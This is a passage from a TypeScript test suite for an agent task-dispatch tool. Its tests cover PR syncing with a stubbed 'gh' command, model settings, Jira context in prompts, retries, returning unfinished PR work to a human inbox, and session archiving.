  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  try {
    const port = (server.address() as { port: number }).port;
    const response = await fetch(`http://127.0.0.1:${port}/api/prs/sync`, { method: "POST", headers: { Authorization: "Bearer test" }, signal: AbortSignal.timeout(700) });
    assert.deepEqual(await response.json(), { ok: true, ran: true });
    const second = await fetch(`http://127.0.0.1:${port}/api/prs/sync`, { method: "POST", headers: { Authorization: "Bearer test" } });
    assert.deepEqual(await second.json(), { ok: true, ran: false });
    const deadline = Date.now() + 5000;
    while (db.getTask("task-1")?.status !== "done" && Date.now() < deadline) await new Promise((resolve) => setTimeout(resolve, 50));
    assert.equal(db.getTask("task-1")?.status, "done");
  } finally {
    await new Promise((resolve) => setTimeout(resolve, 2500));
    server.closeAllConnections();
    await new Promise<void>((resolve) => server.close(() => resolve()));
    db.close();
    process.env.PATH = originalPath;
    rmSync(dir, { recursive: true, force: true });
  }
});

test("PR sync completes a merged reported PR when the task branch differs", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-reported-pr-"));
  const originalPath = process.env.PATH;
  try {
    writeFileSync(join(dir, "gh"), `#!/bin/sh
case "$*" in
  "pr view https://github.com/example/repo/pull/15"*) echo '{"url":"https://github.com/example/repo/pull/15","title":"fix","state":"MERGED","number":15}' ;;
  *) exit 1 ;;
esac
`, { mode: 0o755 });
    process.env.PATH = `${dir}:${originalPath}`;
    const db = new Db(join(dir, "test.db"));
    db.insertTask(makeTask({ branch: "original-branch", status: "done", repo_path: dir }));
    const hub = { broadcast: () => undefined };
    const { backend } = fakeBackend();
    const capture = new CaptureEngine(db, backend, hub, {} as Config);
    await capture.createStructuredQuestion({ kind: "done", taskId: "task-1", title: "Done", body: "PR: https://github.com/example/repo/pull/15" });
    await syncAllPrs(db, hub, { knownPrsOnly: true }, 0);
    assert.equal(db.getTask("task-1")?.status, "done");
    assert.equal(db.listItems({ kind: "pr" })[0].status, "archived");
    db.close();
  } finally {
    process.env.PATH = originalPath;
    rmSync(dir, { recursive: true, force: true });
  }
});

test("task model settings survive storage and are used for dispatch", async () => {
  const db = new Db(":memory:");
  const dir = mkdtempSync(join(tmpdir(), "corral-model-"));
  try {
    execFileSync("git", ["init", dir], { stdio: "ignore" });
    const task = makeTask({ repo_path: dir, model: "model-x", reasoning: "high" });
    db.insertTask(task);
    const stored = db.getTask(task.id)!;
    assert.equal(stored.model, "model-x");
    assert.equal(stored.reasoning, "high");
    const { backend, started } = fakeBackend();
    await dispatchTask(db, { configDir: dir, host: "localhost", port: 4787, token: "" } as Config, backend, stored, "codex", { useWorktree: false });
    assert.equal(started[0].model, "model-x");
    assert.equal(started[0].reasoning, "high");
  } finally { db.close(); rmSync(dir, { recursive: true, force: true }); }
});

test("dispatch includes the stored Jira link in the agent's task context", async () => {
  const db = new Db(":memory:");
  const dir = mkdtempSync(join(tmpdir(), "corral-jira-dispatch-"));
  try {
    execFileSync("git", ["init", dir], { stdio: "ignore" });
    const task = makeTask({ repo_path: dir, title: "PROJ-42 Fix issue", prompt: "Ticket description", jira_key: "PROJ-42", jira_url: "https://jira.example/browse/PROJ-42" });
    db.insertTask(task);
    const { backend, started } = fakeBackend();
    await dispatchTask(db, { configDir: dir, host: "localhost", port: 4787, token: "" } as Config, backend, db.getTask(task.id)!, "codex", { useWorktree: false });
    assert.match(started[0].prompt, /https:\/\/jira\.example\/browse\/PROJ-42/);
    assert.match(started[0].prompt, /Ticket description/);
  } finally { db.close(); rmSync(dir, { recursive: true, force: true }); }
});

test("retries an initial worker failure once with the original prompt", async () => {
  const db = new Db(":memory:");
  try {
    db.insertTask(makeTask({ status: "dispatched", terminal_address: "s1" }));
    const { backend, sent } = fakeBackend();
    Object.assign(backend, { initialFailurePrompt: async () => "original prompt" });
    const capture = new CaptureEngine(db, backend, { broadcast() {} });
    const event = { type: "status" as const, address: "s1", task_id: "task-1", status: "idle" };
    await capture.handleEvent(event);
    await capture.handleEvent(event);
    await new CaptureEngine(db, backend, { broadcast() {} }).handleEvent(event);
    assert.deepEqual(sent, [{ address: "s1", text: "original prompt" }]);
  } finally { db.close(); }
});

test("PR work in flight: the item leaves the open inbox until the run ends", async () => {
  const db = new Db(":memory:");
  try {
    db.insertTask(makeTask({ status: "done", branch: "feat-x", terminal_address: "s1" }));
    const prItem: Item = {
      id: "item-1",
      kind: "pr",
      status: "open",
      title: "PR needs work: feat: x",
      summary: "merge conflicts",
      body: "PR: https://example.com/pr/7",
      context: "",
      options: null,
      ready: 0,
      handling: 1,
      source_ref: "s1",
      task_id: "task-1",
      structured: 1,
      created_ms: Date.now(),
      updated_ms: Date.now(),
      resolved_ms: null,
      snooze_until_ms: null,
    };
    db.insertItem(prItem);
    db.upsertTerminal({
      address: "s1",
      task_id: "task-1",
      name: "corral-test",
      agent: "claude",
      last_status: "working",
      last_turn: 1,
      updated_ms: Date.now(),
    });
    const broadcast: [string, unknown][] = [];
    const capture = new CaptureEngine(db, {} as WorkerBackend, {
      broadcast: (t: string, d: unknown) => broadcast.push([t, d]),
    });

    // Still working: nothing changes.
    await capture.handleEvent({ type: "status", address: "s1", task_id: "task-1", status: "working" });
    assert.equal(db.getItem("item-1")?.handling, 1);

    // The run ends without fixing the PR: the human gets it back.
    await capture.handleEvent({ type: "status", address: "s1", task_id: "task-1", status: "idle" });
    assert.equal(db.getItem("item-1")?.handling, 0, "the item is no longer handled by the agent");
    assert.equal(db.getItem("item-1")?.status, "open", "and it is back in the open inbox");
    assert.ok(broadcast.some(([type]) => type === "item.updated"), "the UI hears about it");

    // A finished session clears it too.
    db.updateItem("item-1", { handling: 1 });
    await capture.handleEvent({ type: "finished", address: "s1", task_id: "task-1", exit_code: 0 });
    assert.equal(db.getItem("item-1")?.handling, 0);
  } finally { db.close(); }
});

test("archive and clean session preserves the task when session archiving fails", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-archive-session-"));
  const db = new Db(join(dir, "test.db"));
  db.insertTask(makeTask({ status: "dispatched", terminal_address: "s1" }));
  const { backend } = fakeBackend();
  let fail = true;
  const addresses: string[] = [];
  backend.archive = async (address) => { addresses.push(address); if (fail) throw new Error("unavailable"); };
  const server = createHttpServer({ db, backend, hub: { broadcast: () => undefined }, cfg: { token: "test" } } as unknown as AppState);
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  try {
    const url = `http://127.0.0.1:${(server.address() as { port: number }).port}/api/tasks/task-1/archive-session`;
    const request = () => fetch(url, { method: "POST", headers: { Authorization: "Bearer test" } });
    assert.equal((await request()).status, 500);
    assert.equal(db.getTask("task-1")?.status, "dispatched");
    fail = false;
    assert.equal((await request()).status, 200);
    assert.equal(db.getTask("task-1")?.status, "archived");
    assert.deepEqual(addresses, ["s1", "s1"]);
  } finally {
    server.closeAllConnections();
    await new Promise<void>((resolve) => server.close(() => resolve()));
    db.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test("interview completion reports become a digest unless documentation produced a PR", async () => {
  const dir = mkdtempSync(join(tmpdir(), "corral-grill-finish-"));
  const db = new Db(join(dir, "test.db"));
  try {
    const { backend } = fakeBackend();
    const capture = new CaptureEngine(db, backend, { broadcast: () => undefined });
    for (const [id, kind, body, expected] of [
      ["discussion", "grill", "Interview complete", "digest"],
      ["docs-empty", "grill-docs", "No documentation changes", "digest"],
      ["docs-pr", "grill-docs", "PR: https://github.com/example/repo/pull/42", "pr"],
    ] as const) {
      db.insertTask(makeTask({ id, kind }));
      const item = await capture.createStructuredQuestion({ kind: "done", taskId: id, title: "Finished", body });
      assert.equal(item.kind, expected);
    }
  } finally {
    db.close();
    rmSync(dir, { recursive: true, force: true });
  }
});
